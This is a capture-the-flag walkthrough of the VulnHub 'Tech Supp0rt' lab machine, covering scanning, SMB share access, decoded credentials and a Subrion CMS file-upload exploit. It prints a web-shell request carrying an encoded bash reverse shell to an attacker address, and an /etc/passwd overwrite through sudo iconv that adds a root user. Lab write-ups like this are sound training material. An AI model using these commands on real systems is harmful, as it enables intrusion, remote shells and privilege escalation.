# Tech Supp0rt
Link: https://www.vulnhub.com/entry/tech_supp0rt-1,708/  
Box: Easy

## Enumeration
### Nmap 

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2021-07-08T16:06:14+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-08T10:36:14
|_  start_date: N/A
```

### Nikto 

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.106
+ Target Hostname:    192.168.1.106
+ Target Port:        80
+ Start Time:         2021-07-08 11:14:52 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 5c367f4428b1f, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3092: /test/: This might be interesting...
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-07-08 11:15:44 (GMT1) (52 seconds)
---------------------------------------------------------------------------
```

### Gobuster

```
/index.html           (Status: 200) [Size: 11321]
/wordpress            (Status: 301) [Size: 318] [--> http://192.168.1.106/wordpress/]
/test                 (Status: 301) [Size: 313] [--> http://192.168.1.106/test/]     
/phpinfo.php          (Status: 200) [Size: 94955]                                    
/server-status        (Status: 403) [Size: 278]
```

/test

Seems to be a test scam page setup on the server..

![image](https://user-images.githubusercontent.com/5285547/124911794-13f10700-dfe5-11eb-9157-13216ec30cdc.png)


/wordpress

Nice, here we can use a tool called wpscan to enum the site.

![image](https://user-images.githubusercontent.com/5285547/124911852-24a17d00-dfe5-11eb-863c-be98046b362e.png)

### Wpscan

Now we have creds lets do some quick enum on the website (wordpress)

```
wpscan --url http://192.168.1.106/wordpress -e

Results:
[i] User(s) Identified:

[+] support
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://192.168.1.106/wordpress/index.php/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Found a user called: support

### Enum4linux

Redacted some infos
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
websvr          Disk      
 IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

S-1-22-1-1000 Unix User\scamsite (Local User)
S-1-5-21-2071169391-1069193170-3284189824-513 TECHSUPPORT\None (Domain Group)
```

### Smbclient

```
smbclient -L 192.168.1.106                                                                                1 ⨯
Enter WORKGROUP\ac1d's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        websvr          Disk      
        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Let's check out that share.

```
smbclient \\\\192.168.1.106\\websvr
```

![image](https://user-images.githubusercontent.com/5285547/124909104-f9695e80-dfe1-11eb-890e-b42198883a53.png)

enter.txt contents
```
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

The hint magic formula hinted to me we need to try a site like cyberchef to decode the string we have.

![image](https://user-images.githubusercontent.com/5285547/124909661-a512ae80-dfe2-11eb-86a2-2f47226c38ea.png)


/subrion

Checking out the new directory gobuster

```
gobuster dir -u http://192.168.1.106/subrion/  -w  /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt    -t 30 -x .txt,.html,.php,.bk,.gz,.png,.sh --wildcard -b 301,302,404

/updates              (Status: 403) [Size: 278]
/license.txt          (Status: 200) [Size: 35147]
/changelog.txt        (Status: 200) [Size: 49250]
/robots.txt           (Status: 200) [Size: 142]  
```

/robots.txt

```
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```

http://IP/subrion/panel/

Going to the panel endpoint we get a login page

![image](https://user-images.githubusercontent.com/5285547/124912678-291a6580-dfe6-11eb-85d7-b0ee8c7c0434.png)

Using the creds we got from the enter.txt we can login. 

## User (www-data)

After loggin in we can enum the webapp.

CMS: Subrion CMS v4.2.1  
Exploits online:  
- https://www.exploit-db.com/exploits/49876

After reading the exploit we can how to exploit, we need to use a ```.phar``` extension for it.  
Lets make a new file and test manually. 

![image](https://user-images.githubusercontent.com/5285547/124915370-5d435580-dfe9-11eb-99ee-88fb689a54e1.png)

![image](https://user-images.githubusercontent.com/5285547/124915415-692f1780-dfe9-11eb-9776-99f2bbd297d5.png)

Lets get a shell and see whats on the box. 

```
http://192.168.1.106/subrion/uploads/cmd.phar?c=echo%20YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEuOTYvOTk5OSAwPiYxIg%3D%3D|base64%20-d|bash
```

![image](https://user-images.githubusercontent.com/5285547/124915697-bf03bf80-dfe9-11eb-8e01-406580277662.png)

## Scamsite (user)

After looking round the system I didn't see much apart from the websvr is owned by root in the /home/scamsite folder

I then looked at the webapps config data to look for any more creds. 

```
/var/www/html/wordpress/wp-config.php
```
```
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Let'ts try that with the user we found in /home

```
su scamsite
ImAScammerLOL!123!
```

## Root

Let's scamsite's sudo -l 

![image](https://user-images.githubusercontent.com/5285547/124916743-e9a24800-dfea-11eb-9416-da306acc75d2.png)

Looking iconv up on gtfobins

![image](https://user-images.githubusercontent.com/5285547/124916801-fcb51800-dfea-11eb-9009-0c372f7f7804.png)

We can read and write files

![image](https://user-images.githubusercontent.com/5285547/124917169-69301700-dfeb-11eb-8994-3abc7de7fb56.png)

This gave me the idea to add myself to the /etc/password file

```
# Make a password

python3 -c "import crypt; print(crypt.crypt('password'))"
$6$o4e7RSldnSqVr908$VUIXnA0II5v1f0OaFmfo/n7/sYapLOphCas1xBGCNRUck3MKq65AiULC7OL5qMlBNu2CCU2PXGkZmS7T21HpV0

#  Setup command. 

hacked:$6$o4e7RSldnSqVr908$VUIXnA0II5v1f0OaFmfo/n7/sYapLOphCas1xBGCNRUck3MKq65AiULC7OL5qMlBNu2CCU2PXGkZmS7T21HpV0:0:0:root:/root:/bin/bash

cat /etc/passwd

Goto cyberchef
add our line to the end of /etc/passwd and base64 encode it
```

![image](https://user-images.githubusercontent.com/5285547/124920742-91217980-dfef-11eb-9832-6d871e242914.png)

```
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKbHhkOng6MTA2OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKbWVzc2FnZWJ1czp4OjEwNzoxMTE6Oi92YXIvcnVuL2RidXM6L2Jpbi9mYWxzZQp1dWlkZDp4OjEwODoxMTI6Oi9ydW4vdXVpZGQ6L2Jpbi9mYWxzZQpkbnNtYXNxOng6MTA5OjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovYmluL2ZhbHNlCnNzaGQ6eDoxMTA6NjU1MzQ6Oi92YXIvcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc2NhbXNpdGU6eDoxMDAwOjEwMDA6c2NhbW1lciwsLDovaG9tZS9zY2Ftc2l0ZTovYmluL2Jhc2gKbXlzcWw6eDoxMTE6MTE5Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpoYWNrZWQ6JDYkbzRlN1JTbGRuU3FWcjkwOCRWVUlYbkEwSUk1djFmME9hRm1mby9uNy9zWWFwTE9waENhczF4QkdDTlJVY2szTUtxNjVBaVVMQzdPTDVxTWxCTnUyQ0NVMlBYR2tabVM3VDIxSHBWMDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2g=
```

Full Command:
```
echo cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKbHhkOng6MTA2OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKbWVzc2FnZWJ1czp4OjEwNzoxMTE6Oi92YXIvcnVuL2RidXM6L2Jpbi9mYWxzZQp1dWlkZDp4OjEwODoxMTI6Oi9ydW4vdXVpZGQ6L2Jpbi9mYWxzZQpkbnNtYXNxOng6MTA5OjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovYmluL2ZhbHNlCnNzaGQ6eDoxMTA6NjU1MzQ6Oi92YXIvcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc2NhbXNpdGU6eDoxMDAwOjEwMDA6c2NhbW1lciwsLDovaG9tZS9zY2Ftc2l0ZTovYmluL2Jhc2gKbXlzcWw6eDoxMTE6MTE5Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpoYWNrZWQ6JDYkbzRlN1JTbGRuU3FWcjkwOCRWVUlYbkEwSUk1djFmME9hRm1mby9uNy9zWWFwTE9waENhczF4QkdDTlJVY2szTUtxNjVBaVVMQzdPTDVxTWxCTnUyQ0NVMlBYR2tabVM3VDIxSHBWMDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2g=|base64 -d | sudo iconv -f 8859_1 -t 8859_1 -o "/etc/passwd"
```

Time to test the user we made 

```
su hacked
password
```

![image](https://user-images.githubusercontent.com/5285547/124920604-646d6200-dfef-11eb-96af-360bcf747e14.png)








